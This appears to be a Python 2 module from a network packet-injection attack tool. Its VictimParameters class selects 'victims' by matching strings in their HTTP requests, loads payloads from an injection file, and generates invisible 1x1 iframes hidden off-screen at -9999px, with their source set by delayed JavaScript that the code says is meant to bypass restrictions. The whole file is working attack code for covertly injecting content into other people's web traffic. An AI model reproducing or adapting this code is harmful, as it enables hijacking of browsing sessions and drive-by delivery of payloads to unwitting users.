from Queue import Queue, Empty
import binascii

class VictimParameters(object):
    """An instance of this class is always necessary to run the application
    
    This class holds your injections.

    Define victim detection parameters.
    For targeted mode, this is a property of Victim.
    For broadcast mode, this is a property of PacketHandler
    """

    def __init__(self, *positional_parameters, **keyword_parameters):
        if 'websites' in keyword_parameters:
            self.websites = keyword_parameters['websites']
        else:
            self.websites = None

        if 'inject_file' in keyword_parameters:
            self.inject_file = keyword_parameters['inject_file']
        else:
            self.inject_file = None

        if 'in_request' in keyword_parameters:
            self.in_request = keyword_parameters['in_request']
        else:
            self.in_request = None

        if 'covert' in keyword_parameters:
            self.covert = keyword_parameters['covert']
        else:
            self.covert = False

        if 'in_request_handler' in keyword_parameters:
            self.in_request_handler = keyword_parameters['in_request_handler']
        else:
            self.in_request_handler = None

        if self.websites is None and self.inject_file is None and self.in_request is None:
            print "[ERROR] Please specify victim parameters"
            exit(1)

        if self.in_request is not None and (self.websites is None and self.inject_file is None):
            print "[ERROR] You must select websites or an inject file for use with in_request"
        else:
            if self.websites is not None:
                self.website_injects = []
                for website in self.websites:
                    self.website_injects.append((website, self.get_iframe(website, "0")))

            if self.inject_file is not None:
                self.file_inject = self.load_injection(self.inject_file)
                self.file_injected = 0


    def default_request_handler(self, request):
        """Default request handler
        Checks if in_request string is contained in the request.
        
        (i.e. in_request="Firefox")
        """
        if self.in_request in request:
            return True
        else:
            return False


    def proc_in_request(self, request):
        """Process the request
        Send it to custom handler if declared, otherwise use default.
        """
        if self.in_request_handler is not None:
            return self.in_request_handler(request)
        else:
            return self.default_request_handler(request)


    def create_iframe(self, website, id):
        """Generate iframe HTML."""
        iframe='''<iframe id="iframe''' + id + '''" width="1" scrolling="no" height="1" frameborder="0" src=""></iframe>\n'''
        return iframe


    def load_injection(self, injectionfile):
        """Loads an injection from file if --injection is set."""
        f = open(injectionfile, 'r')
        try:
            data = f.read()
        finally:
            f.close()
        return data

        ## GZIP - NOT IMPLEMENTED YET
        #f = open(injectionfile, 'r')
        #try:
            #data = f.read()
        #finally:
            #f.close()

        #buf = StringIO()
        #f = gzip.GzipFile(mode = 'wb', fileobj = buf)
        #try:
            #f.write(data)
        #finally:
            #f.close()

        #compressed_data = buf.getvalue()
        #k = binascii.hexlify(compressed_data)
        #n = 2
        #inject = "0x"
        #for item in [k[i:i+n] for i in range(0, len(k), n)]:
            #inject += item + " "
        #print inject


    def create_iframe_injection(self, injects):
        """Creates the final injection string when --websites is set."""
        proceed = 0
        f = '\n'
        f += '''<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n'''
        f += '''<html xmlns="http://www.w3.org/1999/xhtml">\n'''
        f += '''<div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">\n'''
        f += injects
        f += '</div>'
        return f


    def get_iframe(self,website,i):
        """iframe generation function, src filled in via JS.
        
        This generates an iFrame with an empty source.
        It will be filled in later via js to bypass restrictions.
        """
        iframes = self.create_iframe(website, str(i))
        iframes += '''<script>\n'''
        iframes += '''function setIframeSrc'''+str(i)+'''() {\n'''
        iframes += '''var s = "''' + website + '''";\n'''
        iframes += '''var iframe1 = document.getElementById('iframe''' + str(i) + '''');\n'''
        iframes += '''if ( -1 == navigator.userAgent.indexOf("MSIE") ) {\n'''
        iframes += '''iframe1.src = s;\n'''
        iframes += '''}\nelse {\n'''
        iframes += '''iframe1.location = s;\n'''
        iframes += ''' }\n}\ntry{\nsetTimeout(setIframeSrc''' + str(i) + ''', 10);\n} catch (err){\n}\n'''
        iframes += '''</script>\n'''
        return self.create_iframe_injection(iframes)